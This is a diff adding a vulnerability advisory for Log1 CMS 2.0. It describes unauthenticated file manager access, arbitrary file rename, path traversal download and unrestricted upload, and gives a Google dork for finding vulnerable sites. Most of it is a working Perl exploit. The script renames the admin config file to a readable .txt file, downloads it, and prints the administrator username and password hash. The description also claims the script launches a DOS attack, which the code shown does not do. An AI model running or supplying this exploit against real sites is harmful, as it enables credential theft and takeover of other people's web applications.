@@ -1,0 +1,89 @@
++---------------------------------------+
+| Log1 CMS 2.0 Multiple Vulnerabilities |
++---------------------------------------+
+ 
+ 
+ 
+Vulnerable Web-App : Log1 CMS 2.0
+Vulnerability      : Multiple Vulnerabilities.
+Author             : Aodrulez. (Atul Alex Cherian)
+Email              : f3arm3d3ar@gmail.com
+Google-Dork        : "POWERED BY LOG1 CMS"
+Tested on          : Ubuntu 10.04
+Vendor		   : http://log1cms.sourceforge.net/
+
+
++---------+
+| Details |
++---------+
+
+This CMS suffers from multiple vulnerabilities.
+
+1] "AjaxFileManager" implemented without the need for a valid session.
+Path: http://localhost/admin/libraries/ajaxfilemanager/ajaxfilemanager.php
+
+2] "ajax_save_name.php" can be used to rename any file on the system/www-root 
+to any name that contains safe extensions (txt,jpg etc)
+
+3] "AjaxFileManager.php" allows download of even php files if its under the 'Root Folder'.
+Exploit: http://localhost/admin/libraries/ajaxfilemanager/ajax_download.php?path=../../../db/uploaded/index.php
+
+4] "main.php" can be used to upload any file-type as long as this is true : "Content-Type: image:jpeg" 
+Exploit:http://localhost/admin/main.php?action=upload
+
+
+
++--------------------+
+| Exploit (Perl Code)|
++--------------------+
+(This exploit will fetch Sensitive Login information
+ from 'http://target.com/admin/config.php' & trigger
+ DOS attack against the Web-Application)
+
+use HTTP::Request::Common qw(POST);
+use LWP::UserAgent;
+use LWP 5.64;
+my $browser = LWP::UserAgent->new();
+my $url=$ARGV[0];
+print "+---------------------------------------+\n";
+print "| Log1 CMS 2.0 Multiple Vulnerabilities |\n";
+print "+---------------------------------------+\n\n";
+print "Author             : Aodrulez. (Atul Alex Cherian)\n";
+print "Email              : f3arm3d3ar\@gmail.com\n";
+print "Google-Dork        : \"POWERED BY LOG1 CMS\"\n";
+if(!$url)
+{die ("\nPlease enter the target url. Ex. perl $0 http://www.test.com");}
+my $ajaxfileman='/admin/libraries/ajaxfilemanager/ajax_save_name.php';
+$response = HTTP::Request->new(POST => $url.$ajaxfileman) or die("\n Connection Error!");
+$response->content_type("application/x-www-form-urlencoded");
+$response->content("original_path=../../../admin/config.php&name=config.txt");
+my $data=$browser->request($response)->as_string;
+if($data!~m/HTTP\/1.1 200 OK/){ die ("\n$url Not Vulnerable!\n");}
+$response = HTTP::Request->new(GET => $url.'/admin/config.txt') or die("\n Connection Error!");
+my $data=$browser->request($response)->as_string;
+$data=~ m/\"(.*?)\";\r\n.*?\"(.*?)\";/g;
+print "\nAdmin Username : ".$1."\nAdmin Password : ".$2." (MD5 Hash)\n";
+
+ 
+ 
++-------------------+
+| Greetz Fly Out To |
++-------------------+
+  
+ 
+1] Amforked()          : My Mentor.
+2] The Blue Genius     : My Boss.
+3] www.orchidseven.com
+4] www.malcon.org
+5] www.isac.org.in
+
+
++-------+
+| Quote |
++-------+
+
+"Learn the Rules really well so you know how to Break them in Multiple Ways." - Aodrulez 
+;)
+
+
+
